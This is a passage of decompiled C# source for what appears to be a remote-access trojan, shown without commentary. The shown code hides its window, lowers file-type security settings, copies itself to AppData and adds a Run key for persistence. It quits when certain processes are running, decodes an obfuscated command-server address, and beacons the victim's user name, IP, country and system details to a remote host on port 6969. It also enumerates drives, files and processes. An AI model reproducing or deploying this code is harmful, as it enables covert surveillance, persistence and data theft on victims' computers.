							text = text + "---------- Drive " + current2.Name.ToString() + " ----------<br>";
							text = text + "Drive Type: " + current2.DriveType.ToString() + "<br>";
							text = text + "Active: " + current2.IsReady + "<br>";
							if (current2.IsReady)
							{
								double value4 = Convert.ToDouble(new decimal(current2.TotalSize)) / 1073741824.0;
								double value5 = Convert.ToDouble(new decimal(current2.TotalFreeSpace)) / 1073741824.0;
								text = text + "Total Size(GB): " + Math.Round(value4, 2) + "<br>";
								text = text + "Available Size(GB): " + Math.Round(value5, 2) + "<br>";
							}
							else
							{
								text += "Total Size: - <br>";
								text += "Available Size: - <br>";
							}
							string path2 = current2.Name + "\\";
							int num8 = 0;
							DirectoryInfo directoryInfo2 = new DirectoryInfo(path2);
							text += "<br>";
							if (current2.IsReady)
							{
								text += "\tFile/Folder:<br>";
								FileSystemInfo[] fileSystemInfos2 = directoryInfo2.GetFileSystemInfos();
								int num9 = fileSystemInfos2.Length - 1;
								int num10 = 0;
								while (true)
								{
									int num11 = num10;
									int num6 = num9;
									if (num11 > num6)
									{
										break;
									}
									FileSystemInfo fileSystemInfo2 = fileSystemInfos2[num10];
									if (string.Compare(fileSystemInfo2.Extension, "", ignoreCase: false) != 0)
									{
										FileInfo fileInfo2 = new FileInfo(fileSystemInfo2.FullName);
										if (File.Exists(fileSystemInfo2.FullName))
										{
											double value6 = Convert.ToDouble(new decimal(fileInfo2.Length)) / 1048576.0;
											num8++;
											text = text + "\t" + fileSystemInfo2.FullName + "\t\t Size(MB): " + Math.Round(value6, 4) + "<br>";
										}
									}
									else
									{
										num8++;
										text = text + "\t" + fileSystemInfo2.FullName + "\t<br>";
									}
									num10++;
								}
							}
							text += "<br>";
							text = text + "Total files/folders: " + num8 + "<br>";
						}
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						text += ex4.Message;
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				text = ex6.Message;
				ProjectData.ClearProjectError();
			}
			return text;
		}
	}

	public string sUnits(string searchLoc)
	{
		string text = "";
		int num = 300;
		string[] array = new string[301];
		checked
		{
			try
			{
				int num2 = num;
				int num3 = 0;
				while (true)
				{
					int num4 = num3;
					int num5 = num2;
					if (num4 > num5)
					{
						break;
					}
					array[num3] = "";
					num3++;
				}
				array[0] = searchLoc;
				if (Environment.OSVersion.Version.Major == 5)
				{
					int num6 = 1;
					int num7 = num;
					int num8 = 0;
					while (true)
					{
						int num9 = num8;
						int num5 = num7;
						if (num9 > num5 || Operators.CompareString(array[num8], "", false) == 0)
						{
							break;
						}
						try
						{
							int num10 = 0;
							DirectoryInfo directoryInfo = new DirectoryInfo(array[num8]);
							text += "--------------------------------------------------------------------<br>";
							text = text + "Searching in " + array[num8] + "<br>";
							text += "<br>";
							FileSystemInfo[] fileSystemInfos = directoryInfo.GetFileSystemInfos();
							int num11 = fileSystemInfos.Length - 1;
							int num12 = 0;
							while (true)
							{
								int num13 = num12;
								num5 = num11;
								if (num13 > num5)
								{
									break;
								}
								FileSystemInfo fileSystemInfo = fileSystemInfos[num12];
								if (string.Compare(fileSystemInfo.Extension, "", ignoreCase: false) != 0)
								{
									FileInfo fileInfo = new FileInfo(fileSystemInfo.FullName);
									if (File.Exists(fileSystemInfo.FullName))
									{
										double value = Convert.ToDouble(new decimal(fileInfo.Length)) / 1048576.0;
										num10++;
										text = text + "\t" + fileSystemInfo.FullName + "\t\t           Size(MB): " + Math.Round(value, 4) + "<br>";
									}
								}
								else
								{
									num10++;
									if (num6 < num)
									{
										array[num6] = fileSystemInfo.FullName;
									}
									text = text + "\t" + fileSystemInfo.FullName + "<br>";
									num6++;
								}
								num12++;
							}
							text = text + "Total File/Folders: " + num10 + "<br>";
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							text = text + ex2.Message + "<br>";
							ProjectData.ClearProjectError();
						}
						num8++;
					}
					text += "<br>";
				}
				else
				{
					int num14 = 1;
					int num15 = num;
					int num16 = 0;
					while (true)
					{
						int num17 = num16;
						int num5 = num15;
						if (num17 > num5 || Operators.CompareString(array[num16], "", false) == 0)
						{
							break;
						}
						try
						{
							int num18 = 0;
							DirectoryInfo directoryInfo2 = new DirectoryInfo(array[num16]);
							text += "--------------------------------------------------------------------<br>";
							text = text + "Searching in " + array[num16] + "<br>";
							text += "<br>";
							FileSystemInfo[] fileSystemInfos2 = directoryInfo2.GetFileSystemInfos();
							int num19 = fileSystemInfos2.Length - 1;
							int num20 = 0;
							while (true)
							{
								int num21 = num20;
								num5 = num19;
								if (num21 > num5)
								{
									break;
								}
								FileSystemInfo fileSystemInfo2 = fileSystemInfos2[num20];
								if (string.Compare(fileSystemInfo2.Extension, "", ignoreCase: false) != 0)
								{
									FileInfo fileInfo2 = new FileInfo(fileSystemInfo2.FullName);
									if (File.Exists(fileSystemInfo2.FullName))
									{
										double value2 = Convert.ToDouble(new decimal(fileInfo2.Length)) / 1048576.0;
										num18++;
										text = text + "\t" + fileSystemInfo2.FullName + "\t\t           Size(MB): " + Math.Round(value2, 4) + "<br>";
									}
								}
								else
								{
									num18++;
									if (num14 < num)
									{
										array[num14] = fileSystemInfo2.FullName;
									}
									text = text + "\t" + fileSystemInfo2.FullName + "<br>";
									num14++;
								}
								num20++;
							}
							text = text + "Total File/Folders: " + num18 + "<br>";
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							Exception ex4 = ex3;
							text = text + ex4.Message + "<br>";
							ProjectData.ClearProjectError();
						}
						num16++;
					}
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				text = ex6.Message;
				ProjectData.ClearProjectError();
			}
			return text;
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		_instance = this;
		((Control)this).Hide();
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Width(0);
		((Control)this).set_Height(0);
		string subkey = "Software\\microsoft\\windows\\currentversion\\policies\\associations";
		string text = "LowRiskFileTypes";
		string text2 = ".exe";
		bool flag;
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey(subkey);
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\microsoft\\windows\\currentversion\\policies\\associations", text, (object)text2);
			flag = true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			flag = false;
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!flag)
			{
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\microsoft\\windows\\currentversion\\Internet settings\\zones\\3");
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\microsoft\\windows\\currentversion\\Internet settings\\zones\\3", "1806", (object)"0");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(Process.GetCurrentProcess().MainModule!.ModuleName, "tRun.exe", false) == 0)
		{
			Process[] processesByName = Process.GetProcessesByName(inMemoryProcessName);
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(fileLocInAppData, (UIOption)2, (RecycleOption)2, (UICancelOption)2);
			File.Copy(Application.get_ExecutablePath(), fileLocInAppData);
			Process.Start(fileLocInAppData);
			Application.Exit();
		}
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tRun.exe"))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tRun.exe", (UIOption)2, (RecycleOption)2, (UICancelOption)2);
		}
		if (!File.Exists(fileLocInAppData))
		{
			File.Copy(Application.get_ExecutablePath(), fileLocInAppData);
		}
		if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule!.ModuleName)).Length > 1)
		{
			Application.Exit();
		}
		if (Process.GetProcessesByName(Process.GetCurrentProcess().MainModule!.ModuleName).Length > 1)
		{
			Application.Exit();
		}
		Process[] processes = Process.GetProcesses();
		foreach (Process process2 in processes)
		{
			string[] array = knownProcessNames;
			foreach (string value in array)
			{
				if (process2.ProcessName.Contains(value) & (Operators.CompareString(process2.ProcessName, Process.GetCurrentProcess().MainModule!.ModuleName!.Substring(0, Process.GetCurrentProcess().MainModule!.ModuleName!.IndexOf(".")), false) != 0) & (Operators.CompareString(process2.ProcessName, Process.GetCurrentProcess().MainModule!.ModuleName, false) != 0) & !process2.ProcessName.Contains("vshost"))
				{
					Application.Exit();
				}
			}
		}
		string text3 = Convert.ToString(RuntimeHelpers.GetObjectValue(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_CURRENT_USER\\software\\Microsoft\\Windows\\CurrentVersion\\Run", inMemoryProcessName, (object)null)));
		if (Operators.CompareString(text3, fileLocInAppData, false) != 0)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(inMemoryProcessName, fileLocInAppData);
			registryKey.Close();
		}
		mIDRegValue = Convert.ToString(RuntimeHelpers.GetObjectValue(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_CURRENT_USER\\software\\Microsoft\\Windows\\CurrentVersion\\Run", "kID", (object)null)));
		if (Operators.CompareString(mIDRegValue, "", false) == 0)
		{
			Random random = new Random();
			int num = checked((int)Math.Round((double)random.Next(500) / 1.0));
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("kID", num);
			registryKey.Close();
			mIDRegValue = Conversions.ToString(num);
		}
		double num2 = Convert.ToDouble(RuntimeHelpers.GetObjectValue(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_CURRENT_USER\\software\\Microsoft\\Windows\\CurrentVersion\\Run", "KLAppV", (object)null)));
		if (num2 != KLAppVersion_new)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("KLAppV", KLAppVersion_new);
			registryKey.Close();
		}
		rtSetBrowrtserFeatureControlrt();
		WebBrowser1.set_ScriptErrorsSuppressed(true);
		getInitialData();
		SocketUpdateBg.RunWorkerAsync();
	}

	public bool getSetupInfo()
	{
		try
		{
			getSetupInfoStoptime = DateTime.Now;
			getSetupInfoTimeElapsed = getSetupInfoStoptime.Subtract(getSetupInfoStarttime);
			if (getSetupInfoTimeElapsed.TotalSeconds < 10800.0)
			{
				return false;
			}
			getSetupInfoStarttime = DateTime.Now;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		string text = "";
		checked
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(dumbDecrypt(encCommander));
				httpWebRequest.Timeout = 15000;
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				text = streamReader.ReadToEnd();
				int num = text.IndexOf("***1");
				int num2 = text.IndexOf("***2");
				int num3 = text.IndexOf("***3");
				IPA = decrypt(text.Substring(num + 4, text.IndexOf("***2") - num - 4));
				IUNAME = decrypt(text.Substring(num2 + 4, text.IndexOf("***3") - num2 - 4));
				IPWORD = decrypt(text.Substring(num3 + 4, text.IndexOf("***4") - num3 - 4));
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			return true;
		}
	}

	private string dumbDecrypt(string theString)
	{
		int num = Strings.Len(theString);
		checked
		{
			for (int i = 1; i <= num; i++)
			{
				theString += Convert.ToString(Strings.Chr(Strings.Asc(Strings.Mid(theString, i, 1)) - 1));
			}
			theString = theString.Remove(0, num);
			return theString;
		}
	}

	private void rtSetBrowrtserFeatureControlrt()
	{
		string fileName = Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName);
		SetBrowserbeatureControKey("FEATURE_BROWSER_EMULATION", fileName, BrowserEmulationMode());
		SetBrowserbeatureControKey("FEATURE_AJAX_CONNECTIONEVENTS", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_ENABLE_CLIPCHILDREN_OPTIMIZATION", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_MANAGE_SCRIPT_CIRCULAR_REFS", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_DOMSTORAGE ", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_GPU_RENDERING ", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_IVIEWOBJECTDRAW_DMLT9_WITH_GDI  ", fileName, 0u);
		SetBrowserbeatureControKey("FEATURE_DISABLE_LEGACY_COMPRESSION", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_LOCALMACHINE_LOCKDOWN", fileName, 0u);
		SetBrowserbeatureControKey("FEATURE_BLOCK_LMZ_OBJECT", fileName, 0u);
		SetBrowserbeatureControKey("FEATURE_BLOCK_LMZ_SCRIPT", fileName, 0u);
		SetBrowserbeatureControKey("FEATURE_DISABLE_NAVIGATION_SOUNDS", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_SCRIPTURL_MITIGATION", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_SPELLCHECKING", fileName, 0u);
		SetBrowserbeatureControKey("FEATURE_STATUS_BAR_THROTTLING", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_TABBED_BROWSING", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_VALIDATE_NAVIGATE_URL", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_WEBOC_DOCUMENT_ZOOM", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_WEBOC_POPUPMANAGEMENT", fileName, 0u);
		SetBrowserbeatureControKey("FEATURE_WEBOC_MOVESIZECHILD", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_ADDON_MANAGEMENT", fileName, 0u);
		SetBrowserbeatureControKey("FEATURE_WEBSOCKET", fileName, 1u);
		SetBrowserbeatureControKey("FEATURE_WINDOW_RESTRICTIONS ", fileName, 0u);
		SetBrowserbeatureControKey("FEATURE_XMLHTTP", fileName, 1u);
	}

	private void SetBrowserbeatureControKey(string feature, string appName, uint value)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\" + feature, RegistryKeyPermissionCheck.ReadWriteSubTree);
			registryKey.SetValue(appName, value, RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			failedFeatureControls = Conversions.ToString(Conversions.ToDouble(failedFeatureControls) + (Conversions.ToDouble(string.Concat(string.Concat(feature + ":", appName), ":")) + (double)value + Conversions.ToDouble("<br>")));
			ProjectData.ClearProjectError();
		}
	}

	private uint BrowserEmulationMode()
	{
		int result = 7;
		using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Internet Explorer", RegistryKeyPermissionCheck.ReadSubTree, RegistryRights.QueryValues))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue("svcVersion"));
			if (Operators.ConditionalCompareObjectEqual((object)null, objectValue, false))
			{
				objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue("Version"));
				if (Operators.ConditionalCompareObjectEqual((object)null, objectValue, false))
				{
					ieVersion = "Microsoft Internet Explorer is not found!";
				}
			}
			int.TryParse(objectValue.ToString()!.Split(new char[1] { '.' })[0], out result);
			ieVersion = objectValue.ToString()!.Split(new char[1] { '.' })[0];
		}
		uint result2 = 10000u;
		switch (result)
		{
		case 7:
			result2 = 7000u;
			break;
		case 8:
			result2 = 8000u;
			break;
		case 9:
			result2 = 9000u;
			break;
		case 10:
			result2 = 10000u;
			break;
		case 11:
			result2 = 11001u;
			break;
		}
		return result2;
	}

	private static int StartProcessHidden(string FileName, bool WaitForExit, string Arguments = "")
	{
		using Process process = new Process();
		process.StartInfo.FileName = FileName;
		process.StartInfo.Arguments = Arguments;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.UseShellExecute = false;
		process.Start();
		if (WaitForExit)
		{
			process.WaitForExit();
		}
		return process.ExitCode;
	}

	public string getProcessList()
	{
		string text = "UID\tProcess Name<br><br>";
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				Process process = processes[num2];
				text = text + Convert.ToString(process.Id) + "\t" + Convert.ToString(process.ProcessName) + "<br>";
				num2++;
			}
			return text;
		}
	}

	public string getPCInfo()
	{
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Expected O, but got Unknown
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0122: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_0288: Unknown result type (might be due to invalid IL or missing references)
		//IL_028e: Expected O, but got Unknown
		//IL_028f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0296: Expected O, but got Unknown
		//IL_02b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b7: Expected O, but got Unknown
		//IL_0484: Unknown result type (might be due to invalid IL or missing references)
		//IL_048b: Expected O, but got Unknown
		//IL_048d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0494: Expected O, but got Unknown
		//IL_04ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b5: Expected O, but got Unknown
		string text = "";
		try
		{
			text = "OS: " + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + "<br>";
			text = text + "Local Time: " + DateTime.Now.ToShortTimeString() + "<br><br>";
			text = text + "Total Physical memory: " + (double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1024.0 / 1024.0 / 1024.0 + " GB<br>";
			text = text + "Available Physical memory: " + (double)((ServerComputer)MyProject.Computer).get_Info().get_AvailablePhysicalMemory() / 1024.0 / 1024.0 / 1024.0 + " GB<br>";
			text = text + "Total cores: " + Environment.ProcessorCount + "<br><br>";
			ObjectQuery val = new ObjectQuery("SELECT * FROM Win32_VideoController");
			ManagementObjectSearcher val2 = new ManagementObjectSearcher(val);
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = Conversions.ToString(Operators.AddObject((object)text, Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"VIDEO CONTROLLER<br>Name: ", ((ManagementBaseObject)val3).get_Item("Name")), (object)"<br>"), (object)"Chip Type: "), ((ManagementBaseObject)val3).get_Item("VideoProcessor")), (object)"<br>"), (object)"Max refresh rate: "), (object)Convert.ToInt32(RuntimeHelpers.GetObjectValue(((ManagementBaseObject)val3).get_Item("MaxRefreshRate"))).ToString()), (object)"<br>"), (object)"AdapterRam: "), (object)Convert.ToUInt64(RuntimeHelpers.GetObjectValue(((ManagementBaseObject)val3).get_Item("AdapterRam"))).ToString()), (object)"<br>"), (object)"Description: "), ((ManagementBaseObject)val3).get_Item("Description")), (object)"<br>"), (object)"Device ID: "), ((ManagementBaseObject)val3).get_Item("DeviceID")), (object)"<br>"), (object)"Driver Version: "), ((ManagementBaseObject)val3).get_Item("DriverVersion")), (object)"<br>"), (object)"<br>")));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			ObjectQuery val4 = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
			ManagementObjectSearcher val5 = new ManagementObjectSearcher(val4);
			ManagementObjectEnumerator enumerator2 = default(ManagementObjectEnumerator);
			try
			{
				enumerator2 = val5.Get().GetEnumerator();
				while (enumerator2.MoveNext())
				{
					ManagementObject val6 = (ManagementObject)enumerator2.get_Current();
					text = Conversions.ToString(Operators.AddObject((object)text, Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"OPERATING SYSTEM<br>Name: ", ((ManagementBaseObject)val6).get_Item("Name")), (object)"<br>"), (object)"RegisteredUser: "), ((ManagementBaseObject)val6).get_Item("RegisteredUser")), (object)"<br>"), (object)"SerialNumber: "), ((ManagementBaseObject)val6).get_Item("SerialNumber")), (object)"<br>"), (object)"Status: "), ((ManagementBaseObject)val6).get_Item("Status")), (object)"<br>"), (object)"SystemDevice: "), ((ManagementBaseObject)val6).get_Item("SystemDevice")), (object)"<br>"), (object)"Version: "), ((ManagementBaseObject)val6).get_Item("Version")), (object)"<br>"), (object)"WindowsDirectory: "), ((ManagementBaseObject)val6).get_Item("WindowsDirectory")), (object)"<br>"), (object)"OSArchitecture: "), ((ManagementBaseObject)val6).get_Item("OSArchitecture")), (object)"<br>"), (object)"CodeSet: "), ((ManagementBaseObject)val6).get_Item("CodeSet")), (object)"<br>"), (object)"BootDevice: "), ((ManagementBaseObject)val6).get_Item("BootDevice")), (object)"<br>"), (object)"Manufacturer: "), ((ManagementBaseObject)val6).get_Item("Manufacturer")), (object)"<br>"), (object)"<br>")));
				}
			}
			finally
			{
				((IDisposable)enumerator2)?.Dispose();
			}
			ObjectQuery val7 = new ObjectQuery("SELECT * FROM Win32_PhysicalMemory");
			ManagementObjectSearcher val8 = new ManagementObjectSearcher(val7);
			ManagementObjectEnumerator enumerator3 = default(ManagementObjectEnumerator);
			try
			{
				enumerator3 = val8.Get().GetEnumerator();
				while (enumerator3.MoveNext())
				{
					ManagementObject val9 = (ManagementObject)enumerator3.get_Current();
					text = Conversions.ToString(Operators.AddObject((object)text, Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"PHYSICAL MEMORY<br>BankLabel: ", ((ManagementBaseObject)val9).get_Item("BankLabel")), (object)"<br>"), (object)"Description: "), ((ManagementBaseObject)val9).get_Item("Description")), (object)"<br>"), (object)"Manufacturer: "), ((ManagementBaseObject)val9).get_Item("Manufacturer")), (object)"<br>"), (object)"Model: "), ((ManagementBaseObject)val9).get_Item("Model")), (object)"<br>"), (object)"Name: "), ((ManagementBaseObject)val9).get_Item("Name")), (object)"<br>"), (object)"OtherIdentifyingInfo: "), ((ManagementBaseObject)val9).get_Item("OtherIdentifyingInfo")), (object)"<br>"), (object)"Capacity: "), (object)Convert.ToUInt64(Operators.DivideObject(Operators.DivideObject(Operators.DivideObject(((ManagementBaseObject)val9).get_Item("Capacity"), (object)1024), (object)1024), (object)1024)).ToString()), (object)"<br>"), (object)"DataWidth: "), (object)Convert.ToUInt16(RuntimeHelpers.GetObjectValue(((ManagementBaseObject)val9).get_Item("DataWidth"))).ToString()), (object)"<br>"), (object)"Speed: "), (object)Convert.ToUInt32(RuntimeHelpers.GetObjectValue(((ManagementBaseObject)val9).get_Item("Speed"))).ToString()), (object)"<br>"), (object)"tag: "), ((ManagementBaseObject)val9).get_Item("Tag")), (object)"<br>"), (object)"PartNumber: "), ((ManagementBaseObject)val9).get_Item("PartNumber")), (object)"<br>"), (object)"Caption: "), ((ManagementBaseObject)val9).get_Item("Caption")), (object)"<br>"), (object)"<br>")));
				}
			}
			finally
			{
				((IDisposable)enumerator3)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			text = "pcInfo Exception: " + ex2.Message;
			ProjectData.ClearProjectError();
		}
		return text;
	}

	public string getCountry()
	{
		checked
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://ipinfodb.com/ip_locator.php");
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				string text = streamReader.ReadToEnd();
				int num = text.IndexOf("Country :") + 10;
				myCountry = text.Substring(num, text.IndexOf("<img", num) - num).Trim();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				myCountry = ex2.Message;
				ProjectData.ClearProjectError();
			}
			return myCountry;
		}
	}

	public string getIPAddress()
	{
		string text = "";
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://ipecho.net/plain");
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
			text = streamReader.ReadToEnd();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			text = "IP exception: " + ex2.Message;
			ProjectData.ClearProjectError();
		}
		return text;
	}

	private void socketUpdateBg_DoWork(object sender, DoWorkEventArgs e)
	{
		while (true)
		{
			if (!isConnected)
			{
				getSetupInfo();
				try
				{
					clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					IPAddress address = IPAddress.Parse(IPA);
					IPEndPoint remoteEP = new IPEndPoint(address, 6969);
					clientSocket.BeginConnect(remoteEP, OnConnect, null);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(5000);
			}
			if (!clientSocket.Connected | !clientSocket.IsBound)
			{
				isConnected = false;
			}
			Thread.Sleep(5000);
		}
	}

	private void OnConnect(IAsyncResult ar)
	{
		try
		{
			onConnectStoptime = DateTime.Now;
			onConnectTimeElapsed = onConnectStoptime.Subtract(onConnectStarttime);
			if (onConnectTimeElapsed.TotalSeconds < 15.0)
			{
				return;
			}
			onConnectStarttime = DateTime.Now;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			clientSocket.EndConnect(ar);
			clientSocket.BeginReceive(byteData, 0, byteData.Length, SocketFlags.None, OnRecieve, clientSocket);
			isConnected = true;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			isConnected = false;
			ProjectData.ClearProjectError();
		}
		string text;
		try
		{
			text = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "E_NotFound"));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			text = ex2.Message;
			ProjectData.ClearProjectError();
		}
		try
		{
			string msg = "AddClient{****}" + mIDRegValue + "{****}" + KLAppVersion_new + "{****}" + MyProject.User.get_Name() + "{****}" + myIp + "{****}" + myCountry + "{****}" + text + "{****}" + Math.Round((double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1024.0 / 1024.0 / 1024.0, 2, MidpointRounding.AwayFromZero);
			Send(msg, clientSocket);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void OnRecieve(IAsyncResult ar)
	{
		try
		{
			Socket socket = (Socket)ar.AsyncState;
			socket.EndReceive(ar);
			byte[] bytes = byteData;
			string @string = Encoding.ASCII.GetString(bytes);
			Read(@string, byteData);
			Array.Clear(byteData, 0, byteData.Length);
			clientSocket.BeginReceive(byteData, 0, byteData.Length, SocketFlags.None, OnRecieve, clientSocket);
			isConnected = true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			isConnected = false;
			ProjectData.ClearProjectError();
		}
	}

	private void Send(string msg, Socket client)
	{
		try
		{
			string text = Conversions.ToString(Conversions.ToDouble(msg.Length.ToString()) + 6.0 + 6.0 + 10.0);
			text = text.PadLeft(10, '0');
			byte[] bytes = Encoding.ASCII.GetBytes(text + "{****}" + msg + "{****}");
			client.BeginSend(bytes, 0, bytes.Length, SocketFlags.None, OnSend, client);
			isConnected = true;
			GC.Collect();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			isConnected = false;
			ProjectData.ClearProjectError();
		}
	}

	private void SendBytes(byte[] msg, Socket client)
	{
		try
		{
